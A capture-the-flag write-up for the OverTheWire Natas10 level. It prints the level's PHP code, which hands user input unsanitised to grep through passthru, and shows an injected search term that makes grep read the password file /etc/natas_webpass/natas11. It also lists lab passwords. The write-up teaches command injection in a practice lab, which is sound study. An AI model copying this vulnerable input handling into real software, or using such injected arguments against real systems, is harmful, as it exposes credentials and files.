# CTF Writeup - **OverTheWire Natas9 - Natas10**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas9 - Natas10
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 3-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use inspect element to troubleshoot and find the flag.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas10
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
URL:      http://natas10.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for Input word.  But we dont know anything about it, So lets input some random value and check it out. 

```bash
For security reasons, we now filter on certain characters
Find words containing: a
# Submit
# African
# Africans
# Allah
# Allah's
# American
# Americanism
# Americanism's
# Americanisms
```

It shows us all the words that have `a` in it. Since, we dont know how it works and how to get the password. Lets view the source code of the it.

```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
# <body>
# <h1>natas10</h1>
# <div id="content">
# For security reasons, we now filter on certain characters<br/><br/>
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# Output:
# <pre>
# <?
# $key = "";
# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }
# if($key != "") {
#     if(preg_match('/[;|&]/',$key)) {
#         print "Input contains an illegal character!";
#     } else {
#         passthru("grep -i $key dictionary.txt");
#     }
# }
# ?>
# </pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

We can see that there is a form which takes our input, and when we submit the input there is a php code which gets executed on the input, Where the code takes our input which is tagged with `needle` in the html and is copied to the `key` variable. Then it check if the key is not NULL value, and then again check if it has special characters. if not then it does a grep of the keyword that we have given on a text file. This is interesting for us because we know that the password is in `/etc/natas_webpass/natas11` we can input use grep to work for use instead. 
 
```bash
a /etc/natas_webpass/natas11
# /etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
# dictionary.txt:African
# dictionary.txt:Africans
# dictionary.txt:Allah
```

So what we did here is that we know that we want to get the password form `/etc/natas_webpass/natas10` but based on the condition that we are not allowed to use special characters. What we did here is that we inputed `a /etc/natas_webpass/natas11` so what technically happens is that this is replaced in the `grep` command before execution. The command becomes `grep -i a /etc/natas_webpass/natas11 dictionary.txt`. This command finds all the words that contain a irrespective of its case in both the `natas11` password file as well as dictionary files. This will give us the password. If `a` is not working, then we can try with some other character.


## Flag

**Flag:** UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

---

## Lessons Learned

It was a good challenge where i learned about how i can give proper inputs to exploit bugs.
